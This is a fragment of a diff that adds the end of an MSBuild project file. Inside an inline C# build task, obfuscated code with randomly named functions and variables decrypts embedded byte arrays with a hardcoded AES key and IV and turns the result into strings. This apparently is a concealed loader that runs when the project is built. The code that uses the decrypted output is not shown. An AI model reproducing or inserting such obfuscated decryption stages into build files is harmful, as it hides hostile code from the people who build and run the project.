+        byte[] zidjahdfoq = {0x40,0x92,0x4f,0x2f,0x41,0x31,0x73,0xc9,0x0c,0xa0,0xcd,0x77,0xdf,0x2e,0x12,0xef};
+        byte[] aes_out = null;
+        using (Aes aesAlg = Aes.Create())
+        {
+            aesAlg.Key = izejhbvitq;
+            aesAlg.IV = zidjahdfoq;
+
+            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+            using (MemoryStream msDecrypt = new MemoryStream(anzbldzbrg))
+            {
+                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                {
+                    using (MemoryStream decryptedData = new MemoryStream())
+                    {
+                        csDecrypt.CopyTo(decryptedData);
+                        return decryptedData.ToArray();
+                    }
+                }
+            }
+        }
+    }
+
+    static string oikbpwhwki(byte[] ynemquycrb)
+    {
+        byte[] wzehkwdsmx = ioaliexatl(ynemquycrb);
+        var v = Encoding.Default.GetString(wzehkwdsmx);
+        return v;
+    }
+		}   
+    	      ]]>
+	      </Code>
+	    </Task>
+	  </UsingTask>
+	</Project>
